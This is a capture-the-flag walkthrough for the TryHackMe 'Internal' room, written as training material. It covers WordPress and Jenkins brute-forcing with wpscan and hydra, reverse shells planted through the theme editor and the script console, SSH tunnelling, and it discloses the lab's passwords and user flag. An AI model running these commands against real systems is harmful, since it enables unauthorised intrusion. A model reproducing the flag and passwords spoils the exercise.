# 🔐 Internal — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-blueviolet?style=for-the-badge)

---

## 📌 Room Info

| Field | Details |
|-------|---------|
| 🏠 Room | [Internal](https://tryhackme.com/room/internal) |
| 🎯 Difficulty | Hard |
| 🏷️ Tags | WordPress, WPScan, Reverse Shell, Port Forwarding, Jenkins, Privilege Escalation, Chisel |
| 👤 Author | Aryan Remje |

---

## 🎯 Objectives

- [ ] Enumerate the target and identify running services
- [ ] Gain initial foothold via WordPress vulnerability
- [ ] Find credentials and escalate to a user account
- [ ] Forward internal ports and exploit Jenkins
- [ ] Escalate to root and capture both flags

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `Nmap` | Port scanning and service enumeration |
| `WPScan` | WordPress vulnerability scanner and brute force |
| `revshells.com` | Generating reverse shell payloads |
| `Netcat (nc)` | Listening for reverse shell connections |
| `Netstat` | Internal port enumeration |
| `Chisel` | Port forwarding / tunneling |
| `Hydra` | Brute forcing Jenkins login |
| `SSH` | Remote login and port forwarding |

---

## 🔍 Enumeration

### Nmap Scan

Running an initial Nmap scan to discover open ports and services on the target:

```bash
nmap -sV -sC -oN nmap-scan.txt internal.thm
```

![Nmap Scan Results](./screenshots/nmap-scan.png)

### Directory Enumeration

After identifying a web service, we ran a directory scan which revealed a hidden `/blog` directory, confirming the site runs on **WordPress**.

![Gobuster Directory Scan](./screenshots/gobuster-scan.png)

![WordPress Confirmed](./screenshots/wordpress-confirmed.png)

---

## 🚪 Initial Access

### Step 1 — WordPress Username Enumeration

Using WPScan to enumerate valid usernames on the WordPress installation:

```bash
wpscan --url http://internal.thm/blog --enumerate u
```

![WPScan Username Enumeration](./screenshots/wpscan-username.png)

We confirmed the username: **admin**

---

### Step 2 — Brute Forcing WordPress Password

Using WPScan with the rockyou wordlist to brute force the admin password:

```bash
sudo wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
```

✅ **Credentials found:**
```
Username : admin
Password : my2boys
```

---

### Step 3 — Logging into WordPress Admin

We logged into the WordPress admin panel at `http://internal.thm/blog/wp-admin` using the credentials obtained above.

![WordPress Admin Login](./screenshots/wp-admin-login.png)

---

### Step 4 — Reverse Shell via Theme Editor

WordPress admin has write access to theme files. We exploited this by editing the **404.php** template inside the theme editor:

```
Appearance → Theme Editor → Assets → 404 Template
```

We generated a PHP reverse shell payload from [revshells.com](https://www.revshells.com/):

![Reverse Shell Payload Generation](./screenshots/revshell-payload.png)

We pasted the payload into the `404.php` file and clicked **Update File**:

![Editing 404.php](./screenshots/404-php-edit.png)

---

### Step 5 — Catching the Shell

Started a Netcat listener on our machine, then triggered the shell by curling the 404.php file:

```bash
# On attacker machine — start listener
nc -lvnp 4444

# Trigger the reverse shell
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

![Reverse Shell Received](./screenshots/reverse-shell-received.png)

We now have a shell as **www-data**.

---

## 🔎 Post Exploitation — Enumeration as www-data

### Exploring the Web Root

```bash
cd /var/www/html
ls -la
```

![Web Root Directory](./screenshots/var-www-html.png)

The web root contains the `index.html` and a `wordpress` directory where the wp-admin files are hosted.

### WordPress Configuration File

```bash
cat /var/www/html/wordpress/wp-config.php
```

![wp-config.php](./screenshots/wp-config.png)

The `wp-config.php` file revealed database credentials, and the MySQL syntax suggested the database was running **internally** on the system.

### Internal Port Scan

To confirm what's running internally we ran:

```bash
netstat -tulnvp
```

![Netstat Output](./screenshots/netstat-ports.png)

> 💡 **Key Finding:** MySQL (port 3306) is running **internally** — this is why it didn't appear in the initial Nmap scan. Port **8080** also looked suspicious and worth investigating.

---

## 🔭 Port 8080 Enumeration

Curling port 8080 revealed an HTTP response — a web page was running internally:

![Port 8080 HTTP Response](./screenshots/port-8080-http.png)

Since we can't access it directly from our browser, we need to tunnel it to our machine. This can be done using **Chisel** for port forwarding.

> 📖 Reference: [Port Forwarding with Chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel#bkmrk-windows)

---

## 🏁 First Flag — User Flag

While exploring the `/opt` directory inside the reverse shell, we discovered a credentials file:

![Credentials in /opt](./screenshots/opt-credentials.png)

```
Username : aubreanna
Password : bubb13guM!@#123
```

We used these credentials to SSH directly into the machine:

```bash
ssh aubreanna@internal.thm
```

![SSH Login as aubreanna](./screenshots/ssh-aubreanna.png)

```
user.txt : THM{int3rna1_fl4g_1}
```

We also found a file called `jenkins.txt` which revealed Jenkins was running on **172.17.0.2:8080** internally.

---

## 📈 Privilege Escalation

### Confirming Jenkins on Port 8080

```bash
curl 172.17.0.2:8080
```

![Jenkins Running Internally](./screenshots/jenkins-port.png)

A web page was confirmed running on that port — this is a **Jenkins** instance.

---

### Port Forwarding Jenkins to Our Machine

We forwarded the internal Jenkins port to our local machine using SSH tunneling:

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

![Port Forwarding](./screenshots/port-forward.png)

To verify the port was successfully forwarded:

```bash
sudo netstat
```

![Netstat Verify](./screenshots/netstat-verify.png)

---

### Brute Forcing Jenkins Login

With Jenkins now accessible at `localhost:8080`, we used Hydra to brute force the login:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form \
"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

![Hydra Jenkins Brute Force](./screenshots/hydra-jenkins.png)

✅ **Jenkins Credentials found:**
```
Username : admin
Password : spongebob
```

---

### Getting Root via Jenkins Script Console

After logging into Jenkins, we navigated to:

```
Manage Jenkins → Script Console
```

![Jenkins Script Console](./screenshots/jenkins-script-console.png)

We generated a **Groovy reverse shell payload** from [revshells.com](https://www.revshells.com/):

![Jenkins Reverse Shell Payload](./screenshots/jenkins-revshell-payload.png)

Executed the payload in the script console and caught the shell on our listener:

![Jenkins Shell Connected](./screenshots/jenkins-shell.png)

Inside the Jenkins machine's `/opt` directory, we found the **root credentials**:

```
Username : root
Password : tr0ub13guM!@#123
```

---

### Logging in as Root

```bash
ssh root@internal.thm
```

![Root Flag](./screenshots/root-flag.png)

---

## 🏆 Flags Summary

| Flag | Value |
|------|-------|
| 🚩 User Flag | `THM{int3rna1_fl4g_1}` |
| 👑 Root Flag | Found in `/root/root.txt` after SSH as root |

---

## 💡 Key Learnings

- **WordPress theme editor** is a critical attack vector when admin credentials are obtained — always check for file write permissions
- **Internal ports** won't show up on external Nmap scans — always enumerate with `netstat` after gaining a foothold
- **Port forwarding with SSH** (`-L` flag) is a simple and effective way to access internally hosted services
- **Jenkins Script Console** is essentially a code execution vulnerability if you have admin access — always secure it
- **Credential reuse** across services (WordPress → SSH → Jenkins) is extremely common in real environments

---

## 📚 References

- [WPScan Documentation](https://wpscan.com/documentation)
- [Reverse Shell Generator — revshells.com](https://www.revshells.com/)
- [Port Forwarding with Chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
- [Jenkins Groovy Script Console RCE](https://www.hackingarticles.in/jenkins-penetration-testing/)
- [SSH Port Forwarding Explained](https://linuxize.com/post/how-to-setup-ssh-tunneling/)

---

*Writeup by [Aryan Remje](https://github.com/Aryan-Remje) · [TryHackMe Profile](https://tryhackme.com/p/AryanRemje)*
